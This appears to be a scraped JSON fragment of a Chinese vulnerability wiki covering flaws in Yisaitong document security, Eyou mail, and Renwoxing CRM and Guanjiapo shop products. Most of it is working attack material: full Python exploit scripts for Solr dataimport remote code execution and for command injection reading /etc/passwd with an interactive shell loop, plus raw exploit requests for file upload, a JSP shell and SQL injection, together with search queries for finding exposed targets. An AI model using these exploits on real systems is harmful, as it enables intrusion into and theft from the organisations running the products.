","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 亿赛通 电子文档安全管理系统 dataimport 存在远程命令执行漏洞，攻击者通过构造特定的请求可执行任意命令 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 亿赛通 电子文档安全管理系统 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"电子文档安全管理系统\" ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 先获取 core name 访问路径 /solr/admin/cores 使用POC执行whoami ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/solr/admin/cores\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/solr/admin/cores.... \\033[0m\".format(target_url)) if 'responseHeader' in response.text and response.status_code == 200: result = re.search( r'\u003cstr name=\"name\"\u003e([\\s\\S]*?)\u003c/str\u003e\u003cstr name=\"instanceDir\"\u003e', response.text, re.I) core_name = result.group(1) print(\"\\033[36m[o] 获取core_name : {} \\033[0m\".format(core_name)) POC_2(target_url, core_name) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, core_name): cmd = \"whoami\" vuln_url = target_url + \"/solr/{}/dataimport?command=full-import\u0026verbose=false\u0026clean=false\u0026commit=false\u0026debug=true\u0026core=tika\u0026name=dataimport\u0026dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20\".format(core_name, cmd) files = { 'stream.body': '''\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cRDF\u003e \u003citem/\u003e \u003c/RDF\u003e''' } try: print(\"\\033[36m[o] 正在执行 whoami ... \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, files=files, verify=False, timeout=5) cmd_response = re.search( r'documents\"\u003e\u003clst\u003e\u003carr name=\"title\"\u003e\u003cstr\u003e([\\s\\S]*?)\u003c/str\u003e\u003c/arr\u003e\u003c/lst\u003e', response.text, re.I) cmd_response = cmd_response.group(1) if response.status_code == 200 and cmd_response: print(\"\\033[36m[o] 命令响应为:\\n{} \\033[0m\".format(cmd_response)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，获取主机权限。 参考链接： https://github.com/di0xide-U/YSTupload/blob/main/exp.md ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 亿赛通 电子文档安全管理系统 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"亿赛通-电子文档安全管理系统\" ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0 Accept: */* Content-Length: 1 Test Shell访问地址：https://your-ip/tttT.jsp ","date":"0001-01-01","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadfilefromclientserviceforclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 亿邮电子邮件系统 ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"亿邮电子邮件系统\" ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞请求包如下 POST /webadm/?q=moni_detail.do\u0026action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Eyou Email SYSTEM \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do\u0026action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}//webadm/?q=moni_detail.do\u0026action=gragh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do\u0026action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|{}||'\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, cmd) ","date":"0001-01-01","objectID":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-moni_detail.do-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"任我行 CRM SmsDataList SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 任我行CRM系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。 任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息。 ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 任我行 CRM ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 “欢迎使用任我行CRM” ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /SMS/SmsDataList/?pageIndex=1\u0026pageSize=30 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: Keywords=\u0026StartSendDate=2020-06-17\u0026EndSendDate=2020-09-17\u0026SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 任我行率先针对中小企业推出了管家婆进销存、财务一体化软件。 管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。 ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 管家婆 订货易在线商城 ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"订货易\" ","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /DialogTemplates/SelectImage.aspx?type=titleimg\u0026size=30*100\u0026pageindex=1\u0026iscallback=true HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b --532c7611457d40f4ae4cd9422973416b Content-Disposition: form-data; name=\"Filedata\"; filename=\"TEST.aspx\" Content-Type: image/jpeg \u003c% Response.Write(\"Test\"); %\u003e --532c7611457d40f4ae4cd9422973416b--\" 